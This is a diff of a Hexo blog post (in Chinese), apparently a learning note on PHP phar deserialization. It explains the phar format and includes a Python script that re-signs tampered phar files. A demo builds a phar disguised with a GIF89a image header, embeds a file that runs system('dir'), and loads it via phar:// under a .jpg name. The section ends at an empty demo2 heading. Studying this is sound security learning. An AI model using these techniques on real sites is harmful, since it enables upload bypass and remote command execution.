@@ -25,11 +25,14 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="phar文件欧耶">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://baozongwi.xyz/images/QQ20240905-201458.png">
+<meta property="og:image" content="https://baozongwi.xyz/images/QQ20240905-202445.png">
 <meta property="article:published_time" content="2024-09-05T11:28:03.000Z">
-<meta property="article:modified_time" content="2024-09-05T11:33:29.052Z">
+<meta property="article:modified_time" content="2024-09-05T13:06:44.141Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="姿势">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://baozongwi.xyz/images/QQ20240905-201458.png">
     
     
     <!--- Icon Part-->
@@ -455,8 +458,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-09-05 19:33:29</span>
-            <span class="mobile">2024-09-05 19:33:29</span>
+            <span class="desktop">2024-09-05 21:06:44</span>
+            <span class="mobile">2024-09-05 21:06:44</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -494,12 +497,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>189 Words</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1k Words</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>1 Mins</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>4 Mins</span>
         </span>
     
     
@@ -519,14 +522,61 @@
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
             <h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>之前在学习php反序列化的时候难免会遇到phar文件的反序列化来恶意载入马，但是始终难以理解这样的姿势，现在再去看，貌似也释然了，这个常用姿势，拿下(以后拿ezphp来骗我也不怕啦)</p>
-<h1 id="0x02-question"><a href="#0x02-question" class="headerlink" title="0x02 question"></a>0x02 question</h1><h2 id="配置php-ini"><a href="#配置php-ini" class="headerlink" title="配置php.ini"></a>配置php.ini</h2><p>或许你自己学习之后兴高采烈的开始了这里的舒坦的时候，诶发现，这怎么生成不了文件在当前目录呢，我们仅仅只是需要修改一个配置就可以了</p>
+<h1 id="0x02-question"><a href="#0x02-question" class="headerlink" title="0x02 question"></a>0x02 question</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p><strong>PHAR</strong> 文件（PHP Archive）是一种用于将多个 PHP 文件和其他资源（如图片、配置文件等）打包成一个单一文件的归档格式，类似于 JAR 文件在 Java 中的功能。PHAR 文件通常用于分发 PHP 应用程序或库，因为它简化了部署，允许将整个项目封装在一个文件中，而不是多个独立文件。<strong>相当于是一个文件夹里面可存放多个<code>php</code>文件</strong>,并且是<strong>不需要解压</strong>的,只不过在web中需要用到<code>phar</code>协议来进行解析</p>
+<h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><blockquote>
+<p>a stub        (文件头)</p>
+<p>a manifest describing the contents         (压缩文件信息)</p>
+<p>the file contents           (压缩文件内容)</p>
+<p>[optional] a signature for verifying Phar integrity (phar file format only)    (签名)</p>
+</blockquote>
+<h3 id="stub"><a href="#stub" class="headerlink" title="stub"></a>stub</h3><p>也就是一个标志吧,格式为</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="meta">&lt;?php</span> xxx; <span class="title function_ invoke__">__HALT_COMPILER</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><code>php</code>语句前面的内容不限，但是语句中必须要有<code>__HALT_COMPILER()</code>,否则<code>phar</code>扩展将无法识别这个文件为<code>phar</code>文件</p>
+<h3 id="manifest"><a href="#manifest" class="headerlink" title="manifest"></a>manifest</h3><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的路径、大小、权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的<code>meta-data</code>，这是上述攻击手法最核心的地方。</p>
+<h4 id="meta-data"><a href="#meta-data" class="headerlink" title="meta-data"></a>meta-data</h4><blockquote>
+<p>meta-data：这是 PHAR 文件的一个特殊功能，允许用户将任意数据存储为文件的元数据，并将其序列化后保存在 Manifest 中。</p>
+<p>Phar之所以能反序列化，是因为Phar文件会以序列化的形式存储用户自定义的<code>meta-data</code>,PHP使用<code>phar_parse_metadata</code>在解析meta数据时，会调用<code>php_var_unserialize</code>进行反序列化操作。</p>
+</blockquote>
+<h3 id="contents"><a href="#contents" class="headerlink" title="contents"></a>contents</h3><p>被压缩文件的内容，比如一句话?:D)</p>
+<h3 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/QQ20240905-201458.png"
+                      alt="1"
+                ></p>
+<p>当我们修改文件的内容时，签名就会变得无效，这个时候需要更换一个新的签名</p>
+<p>EXP</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    f = file.read() </span><br><span class="line">s = f[:-<span class="number">28</span>] <span class="comment"># 获取要签名的数据</span></span><br><span class="line">h = f[-<span class="number">8</span>:] <span class="comment"># 获取签名类型和GBMB标识</span></span><br><span class="line">newf = s + sha1(s).digest() + h <span class="comment"># 数据 + 签名 + (类型 + GBMB)</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;newtest.phar&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(newf) <span class="comment"># 写入新文件</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="配置php-ini"><a href="#配置php-ini" class="headerlink" title="配置php.ini"></a>配置php.ini</h2><p>或许你自己学习之后兴高采烈的开始了这里的舒坦的时候，诶发现，这怎么生成不了文件在当前目录呢，我们仅仅只是需要修改一个配置就可以了</p>
 <p>打开<code>php.ini</code>找到</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Phar]</span><br><span class="line">; http://php.net/phar.readonly</span><br><span class="line">;phar.readonly = On</span><br></pre></td></tr></table></figure></div>
 
 <p><code>;</code>意味着这一行其实是被注释了的，我们把<code>;</code>删掉改成</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Phar]</span><br><span class="line">; http://php.net/phar.readonly</span><br><span class="line">phar.readonly = Off</span><br></pre></td></tr></table></figure></div>
 
+<p>就可以生成phar文件了</p>
+<h2 id="demo1"><a href="#demo1" class="headerlink" title="demo1"></a>demo1</h2><p>这里我们自己写一个最简单的来尝试一下,并且利用010看看底层数据信息</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;bao&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();     <span class="comment">//开缓冲</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title class_">Hello</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;m.php&quot;</span>,<span class="string">&quot;&lt;?=system(&#x27;dir&#x27;);?&gt;&quot;</span>);  <span class="comment">//写入m.php</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();      <span class="comment">//关缓冲</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
 
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/QQ20240905-202445.png"
+                      alt="2"
+                ></p>
+<p>嗯确实是序列化存储的，并且也都验证了之前所说的结构,同时来包含试试看</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;phar://phar.phar&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>成功了<code>GIF89abao</code></p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 包含并执行 PHAR 文件中的 m.php 文件</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;phar://phar.phar/m.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>这样的话也成功执行了命令，那么本身我们就有图片头我们能不能不写<code>phar</code>来绕过呢</p>
+<p>没错很简单，经过我的测试，由于有图片头，所以直接改文件后缀即可包含</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 包含并执行 PHAR 文件中的 m.php 文件</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;phar://phar.jpg/m.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="demo2"><a href="#demo2" class="headerlink" title="demo2"></a>demo2</h2>
         </div>
 
         
@@ -540,7 +590,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-09-05 19:33:29
+                    :</strong> 2024-09-05 21:06:44
             </li>
         
         <li>
@@ -649,7 +699,7 @@
     <div class="post-toc">
         <div class="toc-title">On this page</div>
         <div class="page-title">浅析phar反序列化</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-question"><span class="nav-text">0x02 question</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%85%8D%E7%BD%AEphp-ini"><span class="nav-text">配置php.ini</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-question"><span class="nav-text">0x02 question</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A6%82%E5%BF%B5"><span class="nav-text">概念</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%93%E6%9E%84"><span class="nav-text">结构</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#stub"><span class="nav-text">stub</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#manifest"><span class="nav-text">manifest</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#meta-data"><span class="nav-text">meta-data</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#contents"><span class="nav-text">contents</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#signature"><span class="nav-text">signature</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%85%8D%E7%BD%AEphp-ini"><span class="nav-text">配置php.ini</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#demo1"><span class="nav-text">demo1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#demo2"><span class="nav-text">demo2</span></a></li></ol></li></ol>
 
     </div>
 </div>
@@ -686,7 +736,7 @@
                     </span>
                     
                         <span>
-                            84.8k words in total
+                            85.7k words in total
                         </span>
                     
                 </p>
